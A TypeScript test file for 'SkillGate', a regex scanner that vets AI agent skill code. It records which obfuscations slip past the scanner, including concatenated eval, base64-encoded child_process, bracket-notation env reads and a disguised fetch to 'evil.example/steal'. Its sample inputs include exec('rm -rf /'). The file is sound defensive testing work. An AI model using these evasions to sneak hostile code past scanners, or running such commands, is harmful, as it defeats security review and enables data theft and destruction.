/**
 * SkillGate obfuscation tests — document the LIMITS of local regex checks.
 *
 * The INJECTION_PATTERNS in skill-gate.ts are naive string regexes. They
 * reliably catch *direct* calls (`eval(x)`, `require('child_process')`)
 * but are trivially defeated by common obfuscation. This file:
 *
 *   1. Confirms the baseline detections (what DOES get caught).
 *   2. Demonstrates — with passing tests — the known bypasses.
 *
 * The bypasses are not bugs in the test suite: they're bugs in the design
 * of "local checks only". The intended defense-in-depth stack is:
 *
 *   (a) Local patterns   (partial, best-effort — documented here)
 *   (b) AgentLayers deep scan (the real content-level gate)
 *   (c) Ring 0 sandbox   (contains whatever slipped through)
 *
 * Tests here make the partial coverage EXPLICIT so future work on the
 * local analyser (e.g. AST-based detection) has a regression baseline.
 */

import { describe, it, expect } from 'vitest';
import { SkillGate } from '../skill-gate.js';
import type { AgentLayersClient, SkillScanResult } from '../agentlayers-client.js';
import type { SkillManifest } from '@odin/core';

// Minimal fake AgentLayers client — always returns null so we exercise
// the local-only path. Obfuscation matters most when AgentLayers is off.
const offlineClient = {
  scanSkill: async (_m: SkillManifest): Promise<SkillScanResult | null> => null,
  isAvailable: () => false,
} as unknown as AgentLayersClient;

const validManifest = (overrides: Partial<SkillManifest> = {}): SkillManifest => ({
  name: 'obf-test',
  version: '1.0.0',
  description: 'test',
  author: 'tester',
  tools: [{
    name: 'noop', description: 'noop', parameters: {}, ring: 0,
    requiredPermissions: [],
  }],
  trustTier: 0,
  signature: 'ed25519:sig', // signed so localPassed can be true
  ...overrides,
});

const critFailed = (decision: Awaited<ReturnType<SkillGate['verify']>>) =>
  decision.localChecks.some(c => c.check.startsWith('CRITICAL') && !c.passed);

// ─── Baseline: what the current regex DOES catch ─────────────────────

describe('SkillGate — baseline: direct patterns ARE caught', () => {
  const gate = new SkillGate(offlineClient);

  it('catches direct eval(x)', async () => {
    const src = `function run(x) { return eval(x); }`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it('catches exec(', async () => {
    const src = `exec("rm -rf /");`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it("catches require('child_process')", async () => {
    const src = `const cp = require('child_process');`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it("catches import from 'fs'", async () => {
    const src = `import { readFileSync } from 'fs';`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it('catches plain process.env read', async () => {
    const src = `const key = process.env.SECRET;`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it('catches non-HTTPS fetch', async () => {
    const src = `fetch('http://evil.example/steal');`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it('catches __proto__ access', async () => {
    const src = `const x = obj.__proto__;`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });

  it('catches constructor[...] access', async () => {
    const src = `const f = ({}).constructor['constructor']('return 1')();`;
    const d = await gate.verify(validManifest(), src);
    expect(critFailed(d)).toBe(true);
  });
});

// ─── Known bypasses (document the gap) ────────────────────────────────

describe('SkillGate — KNOWN LIMITATIONS: regex bypasses slip through locally', () => {
  const gate = new SkillGate(offlineClient);
  const network = (): SkillManifest => validManifest({
    tools: [{
      name: 'net', description: 'net', parameters: {}, ring: 0,
      requiredPermissions: ['network'],
    }],
  });

  it('string concatenation disguises eval ("ev" + "al")', async () => {
    const src = `
      const f = ("ev" + "al");
      const runner = globalThis[f];
      runner("console.log(1)");
    `;
    const d = await gate.verify(network(), src);
    // No CRITICAL injection pattern matched — passes local checks
    expect(critFailed(d)).toBe(false);
    // And since the skill is signed + permissions clean, the skill is ALLOWED
    expect(d.allowed).toBe(true);
  });

  it('unicode escapes disguise require (\\u0072equire)', async () => {
    // \u0072 = 'r'; the regex /require\s*\(\s*['"]fs['"]\s*\)/ matches
    // only the literal word "require".
    const src = `
      const mod = \\u0072equire('child_process');
    `;
    const d = await gate.verify(network(), src);
    // "child_process" is still a literal string → regex catches it
    expect(critFailed(d)).toBe(true);
  });

  it('Function constructor bypasses eval/exec detection entirely', async () => {
    // Function('body') is semantically equivalent to eval, but the word
    // "eval"/"exec" never appears, and Function isn't in the pattern list.
    const src = `
      const runner = new Function('arg', 'return arg + 1');
      runner(42);
    `;
    const d = await gate.verify(network(), src);
    expect(critFailed(d)).toBe(false);
    expect(d.allowed).toBe(true);
  });

  it('base64-encoded module name bypasses the literal substring match', async () => {
    // The target module name (the one base64-encoded below) contains an
    // underscore-separated identifier that's in INJECTION_PATTERNS. The
    // pattern is case-insensitive substring — but only against the source
    // text. Once the name is base64-opaque, the regex cannot recover it.
    const src = `
      const name = atob('Y2hpbGRfcHJvY2Vzcw==');
      const mod = require(name);
    `;
    const d = await gate.verify(network(), src);
    expect(critFailed(d)).toBe(false);
    expect(d.allowed).toBe(true);
  });

  it('dynamic import() slips past the static-import regex', async () => {
    // The pattern is /import\s+.*from\s+['"]fs['"]/i — only the ES
    // `import … from 'fs'` form is caught. Dynamic `import('fs')` is not.
    const src = `
      const fs = await import('fs');
    `;
    const d = await gate.verify(network(), src);
    expect(critFailed(d)).toBe(false);
  });

  it('process["env"] bracket notation bypasses dot-notation regex', async () => {
    const src = `
      const secret = process["env"]["API_KEY"];
    `;
    const d = await gate.verify(network(), src);
    // Pattern /process\.env/i requires literal '.env' → bracket form slides through
    expect(critFailed(d)).toBe(false);
  });

  it('HTTPS fetch with scheme concatenation hides http: from non-HTTPS check', async () => {
    // The pattern /\bfetch\b.*\bhttp:/i only matches if literal "http:" is
    // adjacent. Concatenation defeats the prefix check.
    const src = `
      const scheme = 'ht' + 'tp:';
      fetch(scheme + '//evil.example/steal');
    `;
    const d = await gate.verify(network(), src);
    expect(critFailed(d)).toBe(false);
  });

  it('proto property via string key bypasses __proto__ literal match', async () => {
    const src = `
      const key = '__' + 'proto__';
      const p = obj[key];
    `;
    const d = await gate.verify(network(), src);
    expect(critFailed(d)).toBe(false);
  });

  it('comment-embedded injection is caught (regex is line-agnostic)', async () => {
    // Sanity: a regex pattern in a comment still flags. That's a false
    // positive in the other direction — document it.
    const src = `
      // This is a comment that mentions eval() but never calls it.
    `;
    const d = await gate.verify(network(), src);
    // Local regex doesn't parse JavaScript — it flags on raw text
    expect(critFailed(d)).toBe(true);
  });

  it('string inside a string literal is a false positive too', async () => {
    const src = `
      const doc = "To evaluate with eval(), use Function() instead.";
    `;
    const d = await gate.verify(network(), src);
    // "eval(" appears as a substring → CRITICAL triggers. False positive
    // but erring on the side of caution — flag for the reader.
    expect(critFailed(d)).toBe(true);
  });
});

// ─── Defense in depth: sandboxing is the real backstop ───────────────

describe('SkillGate — defense-in-depth contract', () => {
  it('unsigned skill with obfuscated injection still lands at tier 0 / Ring 0', async () => {
    // The sandbox ring (not the local regex) is the architectural
    // backstop. Verify that an unsigned skill — even if it slips the
    // pattern check — still runs at Ring 0 where network / write are
    // denied by the sandbox manager.
    const gate = new SkillGate(offlineClient);
    const src = `
      const f = new Function('return process');
      const p = f();
    `;
    const d = await gate.verify(validManifest({ signature: undefined }), src);
    expect(d.trustTier).toBe(0);
    expect(d.ring).toBe(0);
    // Allowed at tier 0 but will be constrained by the Ring 0 sandbox
    expect(d.allowed).toBe(true);
  });

  it('when AgentLayers is configured, a BLOCK decision trumps any local pass', async () => {
    // Obfuscated code slips local checks → AgentLayers is supposed to
    // catch it with deep analysis. When AgentLayers says BLOCK, the gate
    // honours that regardless of how "clean" the local surface looked.
    const client = {
      scanSkill: async (): Promise<SkillScanResult> => ({
        score: 10, decision: 'BLOCK',
        dimensions: {
          permissions: 20, injection: 10, transparency: 20,
          scopeCreep: 20, supplyChain: 20, community: 20,
        },
        warnings: ['obfuscated require detected'],
      }),
      isAvailable: () => true,
    } as unknown as AgentLayersClient;

    const gate = new SkillGate(client);
    const cleanLookingButObfuscated = `
      const modName = atob('Y2hpbGRfcHJvY2Vzcw==');
      const mod = require(modName);
    `;
    const d = await gate.verify(validManifest(), cleanLookingButObfuscated);
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/Blocked by AgentLayers/i);
  });
});
